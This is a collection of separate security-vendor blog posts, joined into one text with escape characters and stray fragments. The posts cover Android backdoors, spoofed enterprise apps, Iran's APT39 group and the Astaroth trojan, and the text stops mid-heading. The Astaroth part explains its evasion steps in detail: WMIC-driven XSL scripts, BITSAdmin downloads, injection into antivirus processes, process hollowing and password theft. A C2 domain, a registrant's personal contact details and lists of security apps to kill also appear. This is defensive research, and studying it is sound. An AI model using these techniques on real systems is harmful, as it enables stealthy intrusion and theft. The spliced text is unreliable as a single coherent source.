domain registration data indicates the following owner:\\nRegistrant Contact Details:\\npeng jia\\npeng jia (bdoufwke123010@gmail.com)\\nbeijingshiahiidienquc.d\\nbeijingshi\\nbeijing,100000\\nCN\\nTel. +86.01078456689\\nFax. +86.01078456689\\nThe command-and-control server is hosting an index page which also serves an APK file:\\nThe referenced “Document.apk” is 333583 bytes in size, MD5: c4c4077e9449147d754afd972e247efc. It has the same functionality as the one described above but contains different text. The new text (in Chinese, about relations between China, Japan and the disputed “Senkaku Islands / Diaoyudao Islands / Diaoyutai Islands”) is shown to the victims and reads as following:\\nWhen opened in a browser, this is what the command-and-control index page looks like:\\nThe text on the top means “Title Title Title” in Chinese, while the other strings appear to be random characters typed from the keyboard.\\nInterestingly, the command and control server includes a publicly accessible interface to work with the victims:\\nSome of the commands with rough translations:\\nThe command-and-control server is running Windows Server 2003 and has been configured for Chinese language:\\nThis, together with the logs, is a strong indicator that the attackers are Chinese-speaking.\\nConclusions\\nEvery day, there are hundreds if not thousands of targeted attacks against Tibetan and Uyghur supporters. The vast majority of these target Windows machines through Word documents exploiting known vulnerabilities such as CVE-2012-0158, CVE-2010-3333 and CVE-2009-3129.\\nIn this case, the attackers hacked a Tibetan activist’s account and used it to attack Uyghur activists. It indicates perhaps an interesting trend which is exploiting the trust relationships between the two communities. This technique reminds us of a combination between ages old war strategies “Divide et impera” and “By way of deception”.\\nUntil now, we haven’t seen targeted attacks against mobile phones, although we’ve seen indications that these were in development.\\nThe current attack took advantage of the compromise of a high-profile Tibetan activist. It is perhaps the first in a new wave of targeted attacks aimed at Android users. So far, the attackers relied entirely on social engineering to infect the targets. History has shown us that, in time, these attacks will use zero-day vulnerabilities, exploits or a combination of techniques.\\nFor now, the best protection is to avoid any APK attachments that arrive on mobile phones via e-mail.\\nWe detect the malware used in this attack as “Backdoor.AndroidOS.Chuli.a”.\\nMD5s:\\nc4c4077e9449147d754afd972e247efc Document.apk\\n0b8806b38b52bebfe39ff585639e2ea2 WUC’s Conference.apk\\nCyber espionage Google Android Mobile Malware Spear Phishing Targeted Attacks\\nShare post on:\\nFacebook\\nTwitter\\nRelated Posts\\nRoaming Mantis, part V\\nMobile malware evolution 2019\\nOperation AppleJeus Sequel\\nThere are 2 comments\\nlinda kissane\\nPosted on\\t\\t\\t\\t\\t\\t\\tAugust 28, 2014. 9:32 pm\\nBecause of the constant targeting of the need for our personal information there has to be a limit.

A new backdoor that we were able to analyze proves just that. Malware targeting the Android platform are continuously improving in performance as well as using new techniques to thwart analysis and to avoid detection.\\nThis Android malware, which Trend Micro detects as ANDROIDOS_ANSERVER.A, arrives as an e-book reader app and can be downloaded from a third-party Chinese app store. It asks for the following permissions upon installation:\\nBased on the permissions requested alone, it is easy to see that this particular malware has a lot of capabilities. Once granted, the permissions can be used to execute the following:\\nAccess network settings\\nAccess the Internet\\nControl the vibrate alert\\nDisable key locks\\nMake a call\\nRead low-level log files\\nRead and write contact details\\nRestart apps\\nWake the device\\nWrite, read, receive, and send SMS\\nFor more information on how cybercriminals utilize permissions in conducting malicious routines, check out our e-book, “When Android Apps Want More Than They Need.”\\nFrom our analysis, we found that this malware has two hardcoded C&C servers to which it connects in order to receive commands and to deliver payloads. The first server is just like the usual remote site to which the malware posts information to and gets commands from. The second C&C server, however, caught our attention more. This is a blog site with encrypted content, which based on our research, is the first time Android malware implemented this kind of technique to communicate.\\nBelow is a diagram of how ANDROIDOS_ANSERVER.A uses the blog site as a C&C server:\\nFurther analysis of the blog content revealed six encrypted posts containing backup C&C server URLs:\\nIn addition, 18 binaries have been uploaded to the blog from July 23 to just last September 26. It should also be noted that one of the updates is named _test, which suggests that this malware is still being further developed.\\nDecrypting the posts and analyzing the binaries, we found out that the files are just different versions of one file. Comparing them, one difference we found is that the newer versions had the capability to display notifications that attempt to trick users into approving the download of an update.\\nAnother addition to later versions is the capability to terminate four security-related apps:\\ncom.qihoo360.mobilesafe\\ncom.tencent.qqpimsecure\\ncom.ijinshan.mguard\\ncom.lbe.security\\nThe use of blog platforms in malware activities is not unheard of. In fact, early this year, a botnet was found using Twitter for issuing commands to infected systems. If anything, this recent adaptation of mobile malware is another sign of continued development and proliferation.\\nMore information on mobile threats as well as ways to keep mobile devices safe from attacks can be found in our Mobile Threat Information Hub.\\nLearn how to protect Enterprises, Small Businesses, and Home Users from ransomware:ENTERPRISE »SMALL BUSINESS»HOME»\\nSecurity Predictions for 2020\\nCybersecurity in 2020 will be viewed through many lenses — from differing attacker motivations and cybercriminal arsenal to technological developments and global threat intelligence — only so defenders can keep up with the broad range of threats.\\nRead our security predictions for 2020.\\nBusiness Process Compromise\\nAttackers are starting to invest in long-term operations that target specific processes enterprises rely on.

      "\"5 active mobile threats spoofing enterprise apps\\nExecutives\\nResearchers\\nIndividuals\\nTopics\\n| Executives\\nMay 25, 2016\\nMay 25, 2016\\n5 active mobile threats spoofing enterprise apps\\nBy David Richardson\\nEnterprise employees use mobile apps every day to get their jobs done, but when malicious actors start impersonating those apps, it spells trouble for IT departments everywhere.\\nLookout recently researched five families of malware doing just that: spoofing real enterprise apps to lure people to download their malware. Our dataset of mobile code shows that these five, active mobile malware families often impersonate enterprise apps by ripping off the legitimate app’s name and package name. These apps include Cisco’s Business Class Email app, ADP, Dropbox, FedEx Mobile, Zendesk, VMWare’s Horizon Client, Blackboard’s Mobile Learn app, and others.\\nAll Lookout customers are protected from these threats.\\nEach family uses this tactic as a means to different ends. You can check out a list of the families and their various malicious aims below.\\nProfiting from trickery\\nIn order to stay afloat, malware authors use a number of tricks to get new victims: one of these is pretending, in some capacity, to be a popular app or brand that people trust. It’s the classic wolf in sheep’s clothing trick and mostly eliminates the need for that malware to do much more convincing.\\nIn this case, these malware families are specifically spoofing an app’s legitimate package name, either using the same package name or one very similar, as well as the app’s name (e.g. “ADP Mobile Solutions”).\\nFor enterprises, this is concerning as many of these apps are either likely to be used by an employee or are technologies that could be deployed by an enterprise, such as Cisco or VMWare. Employees are also more likely to trust enterprise brands they know and work with daily. Because of that, they are more likely to award permissions to apps pretending to be those trusted brands, and less likely to uninstall them.\\nImpact on the enterprise\\nThe fact that mobile malware authors are moving to this kind of trickery is no shock to us. Enterprise data is valuable and mobile attacks on enterprises are actually happening. According to a report from The Ponemon Institute, 67% of IT and security pros say that their organization has likely already been hit by an attack through mobile. Another 83% confirm employees’ mobile devices are susceptible to attack. This means that mobile has become a legitimate vector for enterprise breach, a vector that is being actively used by criminals.\\nUnfortunately, MDM (mobile device management) isn’t a silver bullet here. These types of management solutions often allow enterprises to blacklist (i.e. block specific apps from running on a device) or whitelist (i.e. exclusively allow specific apps to run on a device). MDMs do this using the app’s package name. If an enterprise uses FedEx, for example, and whitelists the shipping company’s app as okay to run on a device, a malicious application using the same package name would easily slip by this mechanism.\\nIn general, the idea that mobile devices running MDM are not impacted by malware is wrong: around 33 out of 1,000 devices running major MDM brands still encounter malware, according to Lookout research observing devices running these solutions. This is just as often as those device not running MDM solutions. This means devices running MDMs will still come in contact with malware, and will need to trust that the security and management solutions running on the device will detect the malware, flag it, and help remediate the situation quickly.\\nHere’s a look into some of the mobile malware pretending to be these legitimate enterprise apps:\\nShuanet\\nWhat does it do?\\nA screenshot from Lookout's previous research into Shuanet.\\nShuanet automatically roots a device, installs itself on the system partition (which makes it very difficult to remove), and then installs further applications at will. These applications could be malicious or could be benign apps, pushed to the phone as part of a scheme to get more downloads. Shuanet may also push very aggressive and intrusive advertising to the device.\\nWhat is the risk to an enterprise? A threat that can root a device and install further applications is particularly concerning because of a few factors. First, rooted devices are devices in an altered state of security. Oftentimes people will root a device to customize it, but they may not know how to properly configure security on the device post-root and also may not receive regular software updates. Secondly, malware like Shuanet not only roots the device, it then installs itself in the system partition, making it very difficult to remove. Even factory resetting a device infected with malware like Shuanet does not remove the threat. Lastly, malware that installs applications could drop further malicious apps onto the device, putting the device and its data at risk.\\nIs it live?\\xa0Yes, this threat is currently active.\\nExamples of apps it spoofs: ADP Mobile Solutions, CamCard Free, Cisco Business Class Email (BCE), Duo Mobile, Google Authenticator, VMWare Horizon Client, Zendesk, Okta Verify\\nAndroRAT\\nWhat does it do? Originally developed as a university project to create a “remote administration tool,” AndroRAT allows a third party to control the device and collect information such as contacts, call logs, text messages, device location, and audio from the microphone. It is now used maliciously by other actors.\\nWhat is the risk to the enterprise?\\nHidden remote access software allows an attacker to easily exfiltrate data, corporate and personal, from the mobile device. Also, having continued remote access to a mobile device allows an attacker to infiltrate corporate wifi networks and VPNs that the infected device connects to.\\nIs it live? Yes, this threat is currently active.\\nExamples of apps it spoofs: Dropbox, Skype, Business Calendar\\nUnsafeControl\\nWhat does it do?\\nUnsafeControl can collect contact information and download it to a third-party’s server. It also has the ability to spam that contact list or send SMS messages to phone numbers specified by its command and control (CNC) servers. The message content is also specified by the CNC.\\nWhat is the risk to the enterprise? Malware like UnsafeControl steals contact information, which can be considered very sensitive information to many enterprises. For example, the contacts within a Chief or VP of Sales’ device might be a competitive advantage for a company.\\nIs it live? Yes, this threat is currently active.\\nExamples of apps it spoofs: FedEx Mobile, Google Keep, Remote VNC Pro, Sky Drive, PocketCloud, Skype\\nPJApps\\nWhat does it do? PJApps may collect and leak the victim’s phone number, mobile device unique identifier (IMEI), and location. In order to make money, it may send messages to premium SMS numbers. PJApps also has the ability to download further applications to the device.\\nWhat is the risk to the enterprise? Malware like PJApps is generally using its functionality for monetary gain, but the technology itself is concerning. Threats that collects location information is generally concerning, but especially when considering executives’ devices. This could mean revealing information about a business’ plans. As discussed, the ability to download further applications to a device also opens the device up to new types of malicious software.\\nIs it live? Yes, this threat is currently active.\\nExamples of apps it spoofs: CamScanner\\nOoqqxx\\nWhat does it do?\\nThis application contains an advertising network which may push ads to your notification bar, create pop-up ads, place shortcuts on your home screen and download large files without asking. It may not be clear that this application is displaying these ads.\\nWhat’s the risk to the enterprise? The risk might be simpler than you think there. If the device an employee performs her job on suddenly starts interrupting her work, that employee is going to send helpdesk tickets to the company’s IT department. Time is money.\\nIs it live? Yes, this threat is currently active.\\nExamples of apps it spoofs: Mobile Learn from Blackboard, Evernote, PocketCloud, Remote Desktop, Adobe Reader, aCalendar\\nKeeping your enterprise safe\\nThe concern is that one of these apps might actually trick an employee who is just looking to FedEx a package or scan a business card in their everyday working activities, and inadvertently put the enterprise at risk. Unfortunately, just having an MDM solution won’t protect you from these threats.\\nThe majority of these apps are likely downloaded through third-party marketplaces and drive-by download attacks.

Specifically, Australia, Norway and South Korea have been removed.\\nIn December 2018, FireEye identified APT39 as an Iranian cyber espionage group responsible for widespread theft of personal information. We have tracked activity linked to this group since November 2014 in order to protect organizations from APT39 activity to date. APT39’s focus on the widespread theft of personal information sets it apart from other Iranian groups FireEye tracks, which have been linked to influence operations, disruptive attacks, and other threats. APT39 likely focuses on personal information to support monitoring, tracking, or surveillance operations that serve Iran’s national priorities, or potentially to create additional accesses and vectors to facilitate future campaigns.\\nAPT39 was created to bring together previous activities and methods used by this actor, and its activities largely align with a group publicly referred to as \"Chafer.\" However, there are differences in what has been publicly reported due to the variances in how organizations track activity. APT39 primarily leverages the SEAWEED and CACHEMONEY backdoors along with a specific variant of the POWBAT backdoor. While APT39\\'s targeting scope is global, its activities are concentrated in the Middle East. APT39 has prioritized the telecommunications sector, with additional targeting of the travel industry and IT firms that support it and the high-tech industry.\\xa0The countries and industries targeted by APT39 are depicted in Figure 1.\\nFigure 1:\\xa0Countries and industries targeted by APT39\\nOperational Intent\\nAPT39\\'s focus on the telecommunications and travel industries suggests intent to perform monitoring, tracking, or surveillance operations against specific individuals, collect proprietary or customer data for commercial or operational purposes that serve strategic requirements related to national priorities, or create additional accesses and vectors to facilitate future campaigns. Government entities targeting suggests a potential secondary intent to collect geopolitical data that may benefit nation-state decision making. Targeting data supports the belief that APT39\\'s key mission is to track or monitor targets of interest, collect personal information, including travel itineraries, and gather customer data from telecommunications firms.\\nIran Nexus Indicators\\nWe have moderate confidence APT39 operations are conducted in support of Iranian national interests based on regional targeting patterns focused in the Middle East, infrastructure, timing, and similarities to APT34, a group that loosely aligns with activity publicly reported as “OilRig”. While APT39 and APT34 share some similarities, including malware distribution methods, POWBAT backdoor use, infrastructure nomenclature, and targeting overlaps, we consider APT39 to be distinct from APT34 given its use of a different POWBAT variant. It is possible that these groups work together or share resources at some level.\\nAttack Lifecycle\\nAPT39 uses a variety of custom and publicly available malware and tools at all stages of the attack lifecycle.\\nInitial Compromise\\nFor initial compromise, FireEye Intelligence has observed APT39 leverage spear phishing emails with malicious attachments and/or hyperlinks typically resulting in a POWBAT infection. APT39 frequently registers and leverages domains that masquerade as legitimate web services and organizations that are relevant to the intended target. Furthermore, this group has routinely identified and exploited vulnerable web servers of targeted organizations to install web shells, such as ANTAK and ASPXSPY, and used stolen legitimate credentials to compromise externally facing Outlook Web Access (OWA) resources.\\nEstablish Foothold, Escalate Privileges, and Internal Reconnaissance\\nPost-compromise, APT39 leverages custom backdoors such as SEAWEED, CACHEMONEY, and a unique variant of POWBAT to establish a foothold in a target environment. During privilege escalation, freely available tools such as Mimikatz and Ncrack have been observed, in addition to legitimate tools such as Windows Credential Editor and ProcDump. Internal reconnaissance has been performed using custom scripts and both freely available and custom tools such as the port scanner, BLUETORCH.\\nLateral Movement, Maintain Presence, and Complete Mission\\nAPT39 facilitates lateral movement through myriad tools such as Remote Desktop Protocol (RDP), Secure Shell (SSH), PsExec, RemCom, and xCmdSvc. Custom tools such as REDTRIP, PINKTRIP, and BLUETRIP have also been used to create SOCKS5 proxies between infected hosts. In addition to using RDP for lateral movement, APT39 has used this protocol to maintain persistence in a victim environment. To complete its mission, APT39 typically archives stolen data with compression tools such as WinRAR or 7-Zip.\\nFigure 2: APT39 attack lifecycle\\nThere are some indications that APT39 demonstrated a penchant for operational security to bypass detection efforts by network defenders, including the use of a modified version of Mimikatz that was repacked to thwart anti-virus detection in one case, as well as another instance when after gaining initial access APT39 performed credential harvesting outside of a compromised entity\\'s environment to avoid detection.\\nOutlook\\nWe believe APT39\\'s significant targeting of the telecommunications and travel industries reflects efforts to collect personal information on targets of interest and customer data for the purposes of surveillance to facilitate future operations. Telecommunications firms are attractive targets given that they store large amounts of personal and customer information, provide access to critical infrastructure used for communications, and enable access to a wide range of potential targets across multiple verticals. APT39\\'s targeting not only represents a threat to known targeted industries, but it extends to these organizations\\' clientele, which includes a wide variety of sectors and individuals on a global scale. APT39\\'s activity showcases Iran\\'s potential global operational reach and how it uses cyber operations as a low-cost and effective tool to facilitate the collection of key data on perceived national security threats and gain advantages against regional and global rivals.\\nPrevious Post\\nNext Post\\nPromotion\\nSubscribe\\nShare\\nRecent\\nRSS\\nEmail UpdatesInformation and insight on today\\'s advanced threats from FireEye.\\nShare\\nRecent Posts\\n24 Feb 2020Ransomware Against the Machine: How Adversaries are Learning to Disrupt\\nIndustrial Production by Targeting IT and OT\\n20 Feb 2020M-Trends 2020: Insights From the Front Lines\\n19 Feb 2020The Missing LNK — Correlating User Search LNK files\\nRSS Feed: Stay Connected\\nCompany\\nWhy FireEye?\\nCustomer Stories\\nCareers\\nCertifications and Compliance\\nInvestor Relations\\nSupplier Documents\\nNews and Events\\nNewsroom\\nPress Releases\\nWebinars\\nEvents\\nAwards and Honors\\nEmail Preferences\\nTechnical Support\\nIncident?\\nReport Security Issue\\nContact Support\\nCustomer Portal\\nCommunities\\nDocumentation Portal\\nFireEye Blogs\\nThreat Research\\nFireEye Stories\\nIndustry Perspectives\\nThreat Map\\nView the Latest Threats\\nContact Us\\n+1 877-347-3393\\nStay Connected\\nLinkedIn\\nTwitter\\nFacebook\\nYouTube\\nPodcast\\nCette page est également disponible en français.\\nVersion française\\nDiese Seite ist auch auf Deutsch verfügbar\\nZur deutschen Seite wechseln\\n日本語ページを\\n見る\\n해당 페이지는 한글 버전으로 보실 수 있습니다\\n바로 가기\\nContinue viewing this page in English\\nCopyright\\xa0©\\xa02020\\xa0FireEye, Inc.\\xa0All rights reserved.\\xa0Privacy & Cookies Policy | Privacy Shield | Legal Documentation\\nSite Language\\nEnglish\\nMy preferred language:\\nEnglish (English)\\nFrench (Français)\\nGerman (Deutsch)\\nJapanese (日本語)\\nKorean (한국어)\\nMore languages', 'Report Double Dragon: APT41, a Dual Espionage and Cyber Crime Operation\\nYour browser is a bit outdated.\\nUpdate it for the best content experience.\\nClose'\n"

Cyber attackers used living off the land binaries (LOLbins) to hide their malicious activity and operate stealthily in target systems. Using native, legitimate operating system tools, attackers were able to infiltrate and gain remote access to devices without any malware. For organizations with limited visibility into their environment, this type of attack can be fatal.\\nIn this research, we explain one of the most recent and unique campaigns involving the Astaroth trojan. This Trojan and information stealer was recognized in Europe and\\xa0chiefly\\xa0affected Brazil through the abuse of native OS processes and the exploitation of security-related products.\\nBrazil is constantly being hit with cybercrime. To read about another pervasive attack in Brazil, check out our blog post.\\nThe Cybereason Platform was able to detect this new variant of the Astaroth Trojan in a massive spam campaign that targeted Brazil and parts of Europe. Our Active Hunting Service team was able to analyze the campaign and identify that it maliciously took advantage of legitimate tools like the BITSAdmin utility and the WMIC utility to interact with a C2 server and download a payload. It was also able to use a component of multinational antivirus software Avast to gain information about the target system, as well as a process belonging to Brazilian information security company GAS Tecnologia to gather personal information. With a sophisticated attack such as this, it is critical for your security team to have a clear understanding of your environment so they can swiftly detect malicious activity and respond effectively.\\nUnique Aspects to this Latest Version of the Astaroth Trojan Campaign\\nThe Astaroth Trojan campaign is a phishing-based campaign that gained momentum towards the end of 2018 and was identified in thousands of incidents. Early versions differed significantly from later versions as the adversaries advanced and optimized their attack. This version contrasted significantly from previous versions in four key ways.\\nThis version maliciously used BITSAdmin to download the attackers payload. This differed from early versions of the campaign that used certutil.\\nThis version\\xa0injects a malicious module into one of\\xa0Avast\\'s processes, whereas early versions of the campaign detected Avast and quit. As Avast is the most common antivirus software in the world, this is an effective evasive strategy.\\nThis version of the campaign made malicious use of unins000.exe, a process that belongs to the Brazilian information security company GAS Tecnologia, to gather personal information undetected. This trusted process is prevalent on Brazilian machines. To the best of our knowledge, no other versions of the malware used this process.\\nThis version used a fromCharCode() deobfuscation method to avoid explicitly writing execution commands and help hide the code it is initiating. Earlier versions did not use this method.\\nA Breakdown of the Latest Astaroth Trojan Spam Campaign\\nAs with many traditional spam campaigns, this campaign begins with a .7zip file. This file gets downloaded to a user machine through a mail attachment or a mistakenly-pressed hyperlink.\\nThe downloaded .7zip file contains a .lnk file that, once pressed, initializes the malware.\\nThe .lnk file extracted from the .7zip file.\\nAn obfuscated command is located inside the Target bar in the .lnk file properties.\\nHidden command inside the .lnk file.\\nThe full obfuscated command inside the .lnk file.\\nWhen the .lnk file is initialized, it spawns a CMD process. This process executes a command to maliciously use the legitimate wmic.exe to initialize an XSL Script Processing (MITRE Technique T1220) attack. The attack executes embedded JScript or VBScript in an XSL stylesheet located on a remote domain (qnccmvbrh.wilstonbrwsaq.pw).\\nwmic.exe is a powerful, native Windows command line utility used to interact with Windows Management Instrumentation (WMI). This utility is able to execute complicated WQL queries and WMI methods. It is often used by attackers for lateral movement, reconnaissance, and basic code invocation. By using a trusted, native utility, the attackers can hide the scope of the full attack and evade detection.\\nThe initial attack vector as detected by the Cybereason Platform.\\nwmic.exe creates a .txt file with information about the domain that stores the remote XSL script. It identifies the location of the infected machine, including country, city, and other information. Once this information is gathered, it sends location data about the infected machine to the remote XSL script.\\nThis location data gives the attacker a unique edge, as they can specify a target country or city to attack and maximize their accuracy when choosing a particular target.\\nThe .txt file contains information about the C2 domain and infected machine, as detected in a Cybereason Lab environment.\\nPhase one: An Analysis of the Remote XSL\\nThe remote XSL script that wmic.exe sends information to contains highly obfuscated JScript code that will execute additional steps of the malicious activity. The code is obfuscated in order to hide any malicious activity on the remote server.\\nInitially, the XSL script defines several variables for command execution and data storage. It also creates several ActiveX objects. The majority of ActiveX Objects created with Wscript.Shell and Shell.Application are used to run programs, create shortcuts, manipulate the contents of the registry, or access system folders. These variables are used to invoke legitimate Windows OS processes for malicious activities, and serve as a bridge between the remote domain that stores the script and the infected machine.\\nMalicious script variables.\\nObfuscation Mechanism for the JScript Code\\nThe malicious JScript code obfuscation relies on two main techniques.\\nThe script uses the function fromCharCode() that returns a string created from a sequence of UTF-16 code units. By using this function, it avoids explicitly writing commands it wants to execute and it hides the actual code it is initiating. In particular, the script uses this function to hide information related to process names. To the best of our knowledge, this method was not used in early versions of the spam campaign.\\nThe script uses the function radador(), which returns a randomized integer. This function is able to obfuscate code so that every iteration of the code is presented differently. In contrast to the first method of obfuscation, this has been used effectively since early versions of the Astaroth Trojan campaign.\\nString.fromCharCode() usage in the XSL script.\\nThe random number generator function radador().\\nThese two obfuscation techniques are used to bypass antivirus defenses and make security researcher investigations more challenging.\\nChoosing a C2 Server\\nThe XSL script contains variable xparis() that holds the C2 domain the malicious files will be downloaded from. In order to extend the lifespan of the domains in case one or more are blacklisted, there are twelve different C2 domains that xparis() can be set to. In order to decide which domain xparis() holds, a variable pingadori() uses the radador() function to randomize the domain. pingadori() is a random integer between one and twelve, which decides which domain xparis() is assigned.\\nThe C2 domain selection mechanism.\\nOne of the most used functions in the XSL script is Bxaki(). Bxaki() takes a URL and a file as arguments. It downloads the file to the infected machine from the input URL using BITSAdmin, and is called every time the script attempts to download a file.\\nIn previous iterations, the Astaroth Trojan campaign used cerutil to download files. In order to hide this process, it was renamed certis. In this iteration, they have replaced certutil with BITSAdmin.\\nBxaki obfuscated function.\\nBxaki deobfuscated function.\\nIn order to gain access to the infected computer’s file system, the XSL script uses the variable fso with FileSystemObject capabilities. This variable is created using an ActiveX object. The XSL script contains additional hard coded variables sVarRaz and sVar2RazX, which contain file paths that direct to the downloaded files.\\nThe file’s path.\\nThe directory creation.\\nDownloading the Payloads\\nThe remote XSL script downloads twelve files from the C2 server that masquerade themselves as JPEG, GIF, and extensionless files. These files are downloaded to a directory (C:\\\\Users\\\\Public\\\\Libraries\\\\tempsys) on the infected machine by Bxaki() and xparis(). Within these twelve files are the Astaroth Trojan modules, several additional files the Trojan may use to extend its capabilities, and an r1.log file. The r1.log file stores information for exfiltration. A thorough explanation of what information is collected can be found in a breakdown by Cofense from late 2018.\\nThe script verifies all parts of the malware have been downloaded.\\nAfter downloading the payload, the XSL script checks to make sure every piece of the malware was downloaded.\\nOne of the twelve download commands as detected by the Cybereason platform in same variant of Astaroth.\\nThe twelve downloaded files.\\nDetecting Avast\\nA unique feature of this latest Astaroth Trojan campaign is the malware\\'s ability to search for specific security products and exploit them.\\nIn earlier variants, upon detecting Avast, the XSL script would simply quit. Instead, it now uses Avast to execute malicious actions.\\nSimilar to earlier versions of the Astaroth Trojan campaign, the XSL script searches for Avast on the infected machine, and specifically targets a certain process of Avast aswrundll.exe. It uses three variables stem1, stem2, and stem3 that, when combined, form a specific path (C:\\\\Program Files\\\\AVAST Software\\\\AVAST\\\\aswRunDll.exe) to aswRundll.exe. It obfuscates this path using the fromCharCode() function.\\naswrundll.exe is the Avast Software Runtime Dynamic Link Library that is responsible for running modules for Avast. If aswrundll.exe exists at this path, Avast exists on the machine.\\nNote: aswrundll.exe is very similar to Microsoft’s own rundll32.exe - it allows you to execute DLLs by calling their exported functions. The use of aswrundll.exe as a LOLbin has been mentioned in the past year.\\nStem variables presented as unicode strings.\\nStem variables decoded to ASCII.\\nManipulating Avast\\nOnce the XSL script has identified that Avast is installed on the machine, it loads a malicious module Irdsnhrxxxfery64 from its location on disk. In order to load this module, it uses an ActiveX Object ShA created with Shell.Application capabilities. The object uses ShellExecute() to create an aswrundll.exe process instance and loads Irdsnhrxxxfery64. It loads the module with parameter vShow set to zero, which opens the application with a hidden window.\\nAlternatively, if Avast is not installed on the machine, the malicious module loads using regsvr32.exe. regsvr32.exe is a native Windows utility for registering and unregistering DLLs and ActiveX controls in the Windows registry.\\nThe script attempts to load the malicious module using regsvr with the run function.\\nProcmon shows the malicious module loaded to the Avast process.\\nProcmon shows the malicious module loaded using the regsvr32.exe process.\\nPhase two: Payload Analysis\\nThe only module the XSL script loads is Irdsnhrxxxfery64, which is packed using the UPX packer.\\nInformation pertaining to lrdsnhxxfery64.~.\\nAfter unpacking the module, it is packed with an additional inner packer Pe123\\\\RPolyCryptor. This module has to be investigated in a dynamic way to fully understand the malware and the role the module played during execution.\\nInformation pertaining to lrdsnhrxxfery64_Unpacked.dll.\\nThroughout the malware execution, Irdsnhrxxxfery64.~ acts as the main malware controller. The module initiates the malicious activity once the payload download is complete. It executes the other modules and collects initial information about the machine, including information about the network, locale, and the keyboard language.\\nThe main module collecting information about the machine.\\nContinuing Malicious Activity and Manipulating Additional Security Products\\nAfter the module loads with regsvr32.exe, the Irdsnhrxxxfery64 module injects another module Irdsnhrxxxfery98, which was downloaded by the script into regsvr32.exe using the LoadLibraryExW() function.\\nSimilar to the previous case, if Avast and aswrundll.exe are on the machine, Irdsnhrxxxfery98 will be injected into that process instead of regsvr32.exe.\\nIrdsnhrxxxfery64 injecting lrdsnhrxxfery98.\\nThe malicious modules in regsvr32.exe memory\\nAfter the Irdsnhrxxxfery98 module is loaded, the malware searches different processes to continue its malicious activity depending on the way Irdsnhrxxxfery64 was loaded.\\nIf Irdsnhrxxxfery64 is loaded using aswrundll.exe, the module will continue to target aswrundll.exe. It will create new instances and continue to inject malicious content to it.\\nIf Irdsnhrxxxfery64 is loaded using regsvr32.exe, it will target three processes:\\nIt will target unins000.exe if it is available. unins000.exe is a process developed by GAS Tecnologia that is common on Brazilian machines.\\nIf unins000.exe does not exist, it will target Syswow64\\\\userinit.exe. userinit.exe is a native Windows process that specifies the program that Winlogon runs when a user logs on to their computer.\\nSimilarly, if unins000.exe and Syswow64\\\\userinit.exe do not exist, it will target System32\\\\userinit.exe.\\nThe malware searches for targeted processes.\\nIrdsnhrxxxfery64 manipulation on userinit.exe & unins000.exe\\nInjection Technique To Increase Stealthiness\\nAfter locating one of the target processes, the malware uses Process Hollowing (MITRE Technique T1093) to evasively create a new process from a legitimate source. This new process is in a suspended state so the malware can unmap its memory and write its contents to the new, allocated space. Once this is complete, it will resume the suspended process. By using this technique, the malware is able to leverage itself from a signed and verified legitimate Windows OS process, or, alternatively, if aswrundll.exe or unins000.exe exists, a signed and verified security product process.\\nAstaroth module creates a process in a suspended state (dwCreationFlags set to 4).\\nUnmapping process memory.\\nWriting content and resuming the process.\\nThe Cybereason platform was able to detect the malicious injection, identifying Irdsnhrxxxfery64.~, Irdsnhrxxxfery98.~, and module arqueiro.\\nThe downloaded modules found in regsvr32.exe as detected by the Cybereason platform.\\nData Exfiltration\\nThe second module Irdsnhrxxxfery98.~ is responsible for a vast amount of information stealing, and is able to collect information through hooking, clipboard usage, and monitoring the keystate.\\nIrdsnhrxxxfery98 information collecting capabilities.\\nIn addition to its own information stealing capabilities, the Astaroth Trojan campaign also uses an external feature NetPass. NetPass is one of the downloaded payload files renamed to lrdsnhrxxferyb.jpg.\\nNetPass is a free network password recovery tool that, according to its developer Nirsoft, can recover passwords including:\\nLogin passwords of remote computers on LAN.\\nPasswords of mail accounts on an exchange server stored by Microsoft Outlook.\\nPasswords of MSN Messenger and Windows Messenger accounts.\\nInternet Explorer 7.x and 8.x passwords from password-protected web sites that include Basic Authentication or Digest Access Authentication.\\nThe item name of Internet Explorer 7 passwords that always begin with Microsoft_WinInet prefix.\\nThe passwords stored by Remote Desktop 6.\\nNetPass usage.\\nAttack Flow and Exfiltration\\nAfter injecting into the targeted processes, the modules continue their malicious activity through those processes. The malware executes malicious activity in a small period of time through the target process, deletes itself, and then repeats. This occurs periodically and is persistent.\\nThe malware’s different functionality.\\nOnce the targeted processes are infected by the malicious modules, they begin communicating with the payload C2 server and exfiltrating information saved to the r1.log file. The communication and exfiltration of data was detected in a real-world scenario using the Cybereason platform.\\nThe malicious use of GAS Tecnologia security process unins000.exe.\\nData exfiltration from unins000.exe to a malicious IP.\\nConclusion\\nOur Active Hunting Service was able to detect both the malicious use of the BITSAdmin utility and the WMIC utility. Our customer immediately stopped the attack using the remediation section of our platform and prevented any exfiltration of data. From there, our hunting team identified the rest of the attack and completed a thorough analysis.\\nWe were able to detect and evaluate an evasive infection technique used to spread a variant of the Astaroth Trojan as part of a large, Brazilian-based spam campaign. In our discovery, we highlighted the use of legitimate, built-in Windows OS processes used to perform malicious activities to deliver a payload without being detected, as well as how the Astaroth Trojan operates and installs multiple modules covertly. We also showed its use of well-known tools and antivirus products to expand its capabilities. The analysis of the tools and techniques used in the Astaroth campaign show how truly effective LOLbins are at evading antivirus products. As we enter 2019, we anticipate that the use of LOLbins will likely increase. Because of the great potential for malicious exploitation inherent in the use of native processes, it is very likely that many other information stealers will adopt this method to deliver their payload into targeted machines.\\nAs a result of this detection, the customer was able to contain an advanced attack before any damage was done. The Astaroth Trojan was controlled, WMIC was disabled, and the attack was halted in its tracks.\\nPart of the difficulty identifying this attack is in how it evades detection. It is difficult to catch, even for security teams aware of the complications ensuring a secure system, as with our customer above. LOLbins are deceptive because their execution seems benign at first, or even sometimes safe, as with the malicious use of antivirus software. As the use of LOLbins becomes more commonplace, we suspect this complex method of attack will become more common as well. The potential for damage will grow as attackers will look to other more destructive payloads.\\nFor more information on LOLbins in the wild,\\xa0read\\xa0our research into a different Trojan.\\nIndicators of 